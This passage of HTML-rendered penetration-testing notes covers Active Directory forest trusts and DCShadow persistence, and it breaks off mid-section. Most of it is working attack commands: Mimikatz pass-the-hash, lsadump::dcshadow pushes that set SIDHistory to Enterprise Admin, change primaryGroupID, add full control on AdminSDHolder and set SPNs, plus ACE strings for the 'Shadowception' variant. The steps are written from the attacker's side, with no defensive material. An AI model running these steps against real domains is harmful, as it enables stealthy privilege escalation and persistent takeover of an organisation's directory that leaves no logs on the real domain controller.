<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 369px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 368.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADTrust</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-punctuation">{(</span><span class="cm-identifier">ForestTransitive</span> <span class="cm-operator">-eq</span> <span class="cm-builtin">$True</span><span class="cm-punctuation">)}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-a-trust-attribute-of">A trust attribute of <code>1096</code> is for PAM (<code>0x00000400</code>) + External Trust (<code>0x00000040</code>) + Forest Transitive (<code>0x00000008</code>).</p>
<h3 id="bkmrk-mssql-server">MSSQL Server</h3>
<p id="bkmrk-everything-is-here.-">Everything is here. (<em>Not for the moment, refactor in progress</em>)</p>
<h2 id="bkmrk-forest-persistence--">Forest Persistence - DCShadow</h2>
<ul id="bkmrk-dcshadow-permits-to-"><li>DCShadow permits to create a rogue Domain Controller on a standard computer in the AD. This permits to modify objects in the AD without leaving any logs on the real Domain Controller</li>
<li>The compromised machine must be in the <strong>root domain</strong> on the forest, and the command must be executed as DA (or similar)</li>
</ul><p id="bkmrk-the-attack-needs-2-i">The attack needs 2 instances on the compromised machine and <strong>Mimikatz</strong>.</p>
<ul id="bkmrk-one-to-start-rpc-ser"><li>One to start RPC servers with SYSTEM privileges and specify attributes to be modified</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 724px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 723.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#With Mimikatz</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#Set SYSTEM privs to the process</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">!+</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">!processtoken</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#Launch the server</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /object:&lt;object_to_modify&gt; /attribute:&lt;attribute_to_modify&gt; /value=&lt;value_to_set&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-and-second-with-enou"><li>And second with enough privileges (DA or otherwise) to push the values :</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 586px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 586.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:&lt;hash&gt; /impersonate</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /push</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-minimal-permissions">Minimal permissions</h3>
<p id="bkmrk-dcshadow-can-be-used">DCShadow can be used with <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow#dcshadow">minimal permissions</a> (and <a href="http://www.labofapenetrationtester.com/2018/04/dcshadow.html">this</a>) by modifying ACLs of :</p>
<ul id="bkmrk-the-domain-object.-d"><li>The domain object.
<ul><li>DS-Install-Replica (Add/Remove Replica in Domain)</li>
<li>DS-Replication-Manage-Topology (Manage Replication Topology)</li>
<li>DS-Replication-Synchronize (Replication Synchornization)</li>
</ul></li>
<li>The Sites object (and its children) in the Configuration container.
<ul><li>CreateChild and DeleteChild</li>
</ul></li>
<li>The object of the computer which is registered as a DC.
<ul><li>WriteProperty (Not Write)</li>
</ul></li>
<li>The target object.
<ul><li>WriteProperty (Not Write)</li>
</ul></li>
</ul><p id="bkmrk-set-dcshadowpermissi"><code>Set-DCShadowPermissions</code> can be used to setup automatically</p>
<p id="bkmrk-to-use-dcshadow-as-u">To use DCShadow as user <strong>user1</strong> to modify <strong>user2</strong> object from machine <strong>machine-user1</strong></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 673px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 672.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DCShadowPermissions</span> <span class="cm-operator">-</span><span class="cm-identifier">FakeDC</span> <span class="cm-identifier">machine-user1</span> <span class="cm-operator">-</span><span class="cm-identifier">SAMAccountName</span> <span class="cm-identifier">user2</span> <span class="cm-operator">-</span><span class="cm-identifier">Username</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-now%2C-the-second-mimk">Now, the <strong>second mimkatz</strong> instance (which runs as DA) is not required.</p>
<h3 id="bkmrk-set-interesting-attr">Set interesting attributes</h3>
<h4 id="bkmrk-set-sidhistory-to-en">Set SIDHistory to Enterprise Admin</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 564px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 564.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:&lt;domain_SID&gt;-519</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-modify-primarygroupi">Modify primaryGroupID</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 499px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 499.19px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-modify-ntsecuritydes">Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user</h4>
<p id="bkmrk-we-just-need-to-appe">We just need to append a Full Control ACE from above for SY/BA/DA with our user's SID at the end.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 984px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 984.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Read the current ACL of high priv groups</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryEntry</span><span class="cm-punctuation">(</span><span class="cm-string">"LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local"</span><span class="cm-punctuation">)).</span><span class="cm-identifier">psbase</span><span class="cm-punctuation">.</span><span class="cm-identifier">ObjectSecurity</span><span class="cm-punctuation">.</span><span class="cm-identifier">sddl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-get-the-sid-of-our-u">Get the SID of our user and append it at the end of the ACLs. Then launch DCShadow like this :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 912px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 911.762px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:&lt;modified ACL&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-set-a-spn-on-an-user">Set a SPN on an user</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 637px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 636.714px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lsadump::dcshadow /object:user1 /attribute:servicePrincipalName /value:"Legitime/User1"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-shadowception">Shadowception</h3>
<p id="bkmrk-we-can-even-run-dcsh">We can even run DCShadow from DCShadow, which is <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcshadow#shadowception-give-dcshadow-permissions-using-dcshadow-no-modified-permissions-logs"><em>Shadowception</em></a> (and <a href="http://www.labofapenetrationtester.com/2018/04/dcshadow.html">still this</a>).</p>
<p id="bkmrk-we-need-to-append-fo">We need to append following ACEs with our user's SID at the end:</p>
<ul id="bkmrk-on-the-domain-object"><li>On the domain object: <code>(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)</code><br><code>(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)</code><br><code>(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)</code>
</li>
<li>On the attacker computer object: <code>(A;;WP;;;UserSID)</code>
</li>
<li>On the target user object: <code>(A;;WP;;;UserSID)</code>
</li>
<li>On the Sites object in Configuration container: <code>(A;CI;CCDC;;;UserSID)</code>
</li>
</ul><h4 id="bkmrk-get-the-acls">Get the ACLs</h4>
<p id="bkmrk-get-the-acls-for-the">Get the ACLs for the Domain Object :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 789px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 788.714px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryServices</span><span class="cm-punctuation">.</span><span class="cm-identifier">DirectoryEntry</span><span class="cm-punctuation">(</span><span class="cm-string">"LDAP://DC=domain,DC=local"</span><span class="cm-punctuation">)).</span><span class="cm-identifier">psbase</span><span class="cm-punctuation">.</span><span class="cm-identifier">ObjectSecurity</span><span class="cm-punctuation">.</span><span class="cm-identifier">sddl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-for-the-attacker-mac">For the attacker machine :</p>
